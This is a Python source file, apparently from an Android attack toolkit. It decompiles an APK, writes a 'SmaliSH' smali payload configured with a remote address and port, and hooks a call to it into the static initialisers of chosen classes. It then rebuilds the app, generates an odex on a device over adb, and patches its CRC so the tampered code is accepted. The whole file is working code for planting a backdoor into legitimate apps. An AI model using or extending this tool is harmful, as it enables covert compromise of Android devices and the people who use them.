import re
import shutil
import subprocess
import os
import glob
import tempfile
import sys

import odexcrc

mydir = os.path.dirname(os.path.realpath(__file__))
ANDROID_HOME = os.environ['ANDROID_HOME']
adb = ANDROID_HOME + 'platform-tools/adb'


def adb_get_device_abi():
    return subprocess.check_output([adb, 'shell', 'getprop', 'ro.product.cpu.abi']) \
        .decode('utf-8') \
        .strip()


def adb_push_dexoptwrapper():
    print('adb push dexopt_wrapper')
    abi = adb_get_device_abi()
    print('device abi is ', abi)
    local_wrapper = mydir + '/../dexoptwrapper/bin/%s/dexopt_wrapper' % abi
    subprocess.check_output([adb, 'push', local_wrapper, '/data/local/tmp/dexopt_wrapper'])
    subprocess.check_output([adb, 'shell', 'chmod 777 /data/local/tmp/dexopt_wrapper'])


def apktool_d(apk, dir):
    print('apktool d')
    subprocess.check_output(['apktool', 'd', apk, '-o', dir, '-f'])


def apktool_dir_get_classes_dirs(dir):
    res = []
    fs = os.listdir(dir)
    for f in fs:
        if f.find('smali_classes') == 0:
            res += [f]
    res.sort()  # todo numeric_sort for smali_classes11
    return res


def get_dex_filename_from_smali_classes_dirname(dir):
    n = re.findall('smali_classes(\d+)', dir)[0]
    return 'classes' + n + '.dex'


def plant_smalish(address, port, classes_dir):
    print('plant smalish to ', os.path.basename(classes_dir))
    res = mydir + '/../shell/re/SmaliSH.smali'

    with open(res, 'rb') as f:
        template = f.read().decode('utf-8')

    template = template.replace('{SMALISH_ADDRES}', address)
    template = template.replace('{SMALISH_PORT}', hex(port))

    dstpath = classes_dir + '/re/SmaliSH.smali'
    os.mkdir(os.path.dirname(dstpath))
    with open(dstpath, 'wb') as dst:
        dst.write(template.encode('utf-8'))
    return [template, 're/SmaliSH.smali']


def plant_smalish_calls(classes_dir, classes, ):
    print('plant_smalish_calls ', classes)
    for cls in classes:
        fs = glob.glob(classes_dir + '/**/%s.smali' % cls)
        if len(fs) != 1:
            raise Exception(fs)
        with open(fs[0], 'rb') as f:
            lines = f.read().decode().splitlines()

        j = 0
        for i in lines:
            if i.find('.method static constructor <clinit>') == 0:
                lines.insert(j + 2, '    invoke-static {}, Lre/SmaliSH;->plant()V')
                break
            j += 1

        with open(fs[0], 'wb') as f:
            f.write('\n'.join(lines).encode('utf-8'))


def dexopt(dexfile, outOdexFile):
    print('dexopt')
    tmpdir = tempfile.mkdtemp()
    shutil.copy(dexfile, tmpdir + '/classes.dex')
    subprocess.check_output(['zip', 'dex.zip', 'classes.dex'], cwd=tmpdir)
    subprocess.check_output([adb, 'push', tmpdir + '/dex.zip', '/data/local/tmp/dex.zip'])
    subprocess.check_output([adb, 'shell', 'rm /data/local/tmp/ok.dex'])
    subprocess.check_output(
        [adb, 'shell', '/data/local/tmp/dexopt_wrapper', '/data/local/tmp/dex.zip', '/data/local/tmp/ok.dex'])
    subprocess.check_output([adb, 'pull', '/data/local/tmp/ok.dex', outOdexFile])


def fix_crc(dex, odex):
    checksum = subprocess.check_output(['crc32', dex]).strip()
    print('fix_crc crc32 = ', checksum, odex)
    modWhen = "2100"  # this is probably checksum of bootclasspath
    print('prev crc ', [hex(i) for i in odexcrc.get(odex)])
    odexcrc.set(odex, int(modWhen, 16), int(checksum, 16))
    print('prev crc ', [hex(i) for i in odexcrc.get(odex)])


def apktool_b(dir):
    print('apktool b')
    subprocess.check_output(['apktool', 'b'], cwd=dir)
